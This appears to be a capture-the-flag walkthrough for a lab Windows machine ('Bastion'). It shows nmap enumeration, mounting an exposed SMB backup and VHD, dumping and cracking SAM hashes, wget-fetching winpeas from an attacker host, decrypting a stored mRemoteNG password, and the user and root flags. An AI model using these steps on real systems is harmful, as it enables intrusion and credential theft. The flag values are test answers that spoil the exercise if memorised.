# Enumeration
## Nmap
```bash
sudo nmap -sC -sV -oA nmap/Bastion 10.10.10.134

PORT    STATE SERVICE      VERSION
22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

## SMB
can see the backups share, going to mount it.
```
sudo mount -t cifs //10.10.10.134/Backups /mnt/smb2
```

Windows image backup.

Looking at the vhd files. The larger one is a full windows install so going to mount that too.

# VHD
```
sudo guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro -v /mnt/vhd
```

Going to pull the SAM and SYSTEM files in `/windows/system32/config` and run secretsdump

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
```

no psexec. :(

Hash cracks to bureaulampje so ssh time

# Shell as L4mpje
user.txt
```
670df9eecaf79a7ea5ec721e336f078b
```

Download winpeas.exe
```
wget http://10.10.14.21/winpeas.exe -o win.exe
```

While thats running checking for installed software shows that mRemoteNG is installed.

There is a python script decoder that can be used. The password will be in the config file.

grabbing the file `C:\Users\L4mpje\AppData\Roaming\mRemoteNG> type .\confCons.xml` and grepping for the password we find this:
```
aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
```

Which decrypts to `thXLHM96BeKL0ER2`

so ssh and root.txt:
```
2e153553704688af16c1d4ff207d79b1
```